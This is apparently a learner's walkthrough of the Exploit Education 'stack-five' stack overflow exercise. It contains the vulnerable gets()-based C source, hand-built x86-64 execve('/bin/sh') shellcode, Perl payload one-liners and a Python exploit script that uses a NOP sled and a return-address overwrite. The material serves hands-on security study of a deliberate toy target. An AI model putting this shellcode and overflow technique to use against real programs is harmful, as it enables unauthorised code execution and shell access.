In this exercise, we finally get our hands dirty with some shellcode. The idea
is to put shellcode in `buffer` and then overwrite the return address to instead
point to the top of the stack frame (for `start_level`).

In real-life, the stack is not executable, and therefore we wouldn't be able to
run code there -- but this is a toy example.

N. B. Last time I did this exercise, my shellcode didn't completely work. I
noticed that LiveOverflow made it work, so I'll use his solution as base this
time around. (It's unnecessary to waste too much time.)

# Source code

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void start_level() {
  char buffer[128];
  gets(buffer);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```

# Walkthrough

Ok, let us start by developing some shellcode. We want the program to run
`execve("/bin/sh",...)`. So let's start by writing a simple C-program that does
just this.

```C
#include<unistd.h>

int main(){
  char * str = "/bin/sh";
  execve(str, 0, 0);
  return 0;
}
```

This disassembles to

```
sub rsp, 0x8
xor edx, edx
lea rdi, [rip+0xfb7]
xor esi,esi
call execve@plt
xor eax,eax
add rsp,0x8
ret
```

What we want is thus to set `edx` and `esi` to zero, and to put a pointer to
`/bin/sh` in `rdi`, and to then run `call execve`. For the latter, we need to
find the address of `execve`. This'll be interesting!

To find `execve`, we run:

```
(gdb) info address execve
```

It shows up as `0x00 00 7f ff f7 da e4 36`. So this is fine. We should be able
to run something along the lines of:

```
xor rdx,rdx
xor rsi,rsi
mov rdi, address to "/bin/sh"
call 0x00007ffff7dae436
```

So let's write the assembly for this, assemble the binary, and create shellcode
from that.

After some consultation with my favorite assembly textbook (Seyfarth's book),
I came up with the following assembly code:

```asm
  section .data
msg: db "/bin/sh",0

  section .text
  global main
  extern execve

main:
  xor rdx, rdx
  xor rsi, rsi
  lea rdi, [msg]
  call execve
```

This runs as we want it to. Let's see what happens when we replace `execve` by
an address -- will it still assemble? The answer is no! However, `call rax` is
fine, so we can do

```asm
  section .data
msg: db "/bin/sh",0

  section .text
  global main
  extern execve

main:
  xor rdx, rdx
  xor rsi, rsi
  lea rdi, [msg]
  mov rax,0x00007ffff7dae436
  call rax
```

So we want to create a payload on the form:

```
/ <- addr X
b
i
n
/
s
h
0
xor rdx,rdx
xor rsi,rsi
mov rdi, X
mov rax,0x00007ffff7dae436
call rax
```

Let's find out what `X` is by running `stack-five` on a sample text. After
inputting `hello` at the `gets`, we find (before `leave`) that `rsp` is

```
0x00007fffffffebf0
```

So we ought to have the following shellcode


```
/ <- addr 0x7fffffffebf0
b
i
n
/
s
h
0
xor rdx,rdx
xor rsi,rsi
mov rdi,0x7fffffffebf0
mov rax,0x7ffff7dae436
call rax
```

We compile this (see `shellcode_final.asm` and the makefile), to obtain (minding
the 16-byte alignment):

```
$ perl -e 'print "/bin/sh\x00","\x90"x8,"\x48\x31\xd2
                                         \x48\x31\xf6
                                         \x48\xbf\xf0\xeb\xff\xff\xff\x7f\x00\x00
                                         \x48\xb8\x36\xe4\xda\xf7\xff\x7f\x00\x00
                                         \xff\xd0",
                                         "\x90"x4' > shellcode_base
```

Now we must recall that we want to overwrite the return address, but let's first
generate the shellcode so we see how many bytes it is.

We find that it is $48=16\cdot 3$ bytes. Let's fill out the rest with `nop`s.

```
$ perl -e 'print "\x90"x80,"\xf0\xeb\xff\xff\xff\x7f\x00\x00"x2' > shellcode_tail
```

Then we just concatenate these two files

```
$ cat shellcode_base shellcode_tail > shellcode_full
```

We notice that we jump to the string, which is of course incorrect, let's fix
this by shifting `0x7fffffffebf0` by 8 bytes, i. e. to `0x7fffffffebf8`, in the
tail.

After doing this, everything works in `gdb` -- it starts to execute `/bin/dash`.
However, when running it outside of `gdb`; it does not and in fact we get
"illegal instruction", which seems to indicate the instructions don't run as
we expect.

Let's take a look at `LiveOverflow` to see how he fixed it.

--- Interlude ---

There are two major differences to when we compare with `LiveOverflow`. He uses
shellcode that includes the string in the code (more fail-safe, we only need
the shellcode to execute, and we don't need the address of `/bin/sh` to be exactly
correct.

Furthermore, he does not jump back in to the stack, and rather jumps forward!
Again, thus is much simpler than what we do. So let's try it in that way.

The return address seems to be stored at

```
0x7fffffffec78
```

so we write a Python script a la LiveOverflow.

```python
import struct
import sys
debug = True
jumpsz = 40
nopsz = 200

padding = b'A'*(128+8)
rip = struct.pack("L",0x7fffffffec78+jumpsz)
nopslide = b'\x90'*200
payload=b'\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68
          \x48\xc1\xeb\x08
          \x53
          \x48\x89\xe7
          \x48\x31\xd2
          \x48\x31\xf6
          \x48\xc7\xc0\x3b\x00\x00\x00
          \x0f\x05'
preload = padding+rip+nopslide
if debug:
  sys.stdout.buffer.write(preload+b'\xcc'+payload)
else:
  sys.stdout.buffer.write(preload+payload)
```

The key to note here is that `jumpsz` and `nopsz` may need to be varied because
the stack layout changes. It is possible to pick `jumpsz` too small and jump
into a mess of weird instructions, instead of the `nop`-sled. So we try to make
the `nop`-sled and try some variations of `jumpsz`.

In the beginning we had `jumpsz=30` and `nopsz=100` and this did not work.

Furthermore, we can see that the code is executed outside of `gdb` with the
`SIGTRAP` -- that's the entire point of it. In the artificial environment of `gdb`
we can see that code is executed by stepping, but outside of `gdb` we can do no
such thing. However, the program can be stopped with `SIGTRAP`, and that's the
point of the `0xcc` instruction.

Hence I set `debug` to `True`, and tried variations of `jumpsz` and `nopsz` until
I got a `SIGTRAP`.

Then finally, I had to employ LiveOverflow's "open pipe" trick

```
$ (python3 exploit.py ; cat) | ./program
```

to make sure that the pipe remained open.

Wow, this one was hard!

## Takeaways

0. `gdb` isn't reality!
1. It's hard to jump back in to the stack.
2. Don't let the shellcode reference strings on the stack. Instead, try to keep
the strings inside the shellcode itself.
3. Use SIGTRAP to debug when outside of `gdb`
4. Use the pipe trick if the program just dies on you.
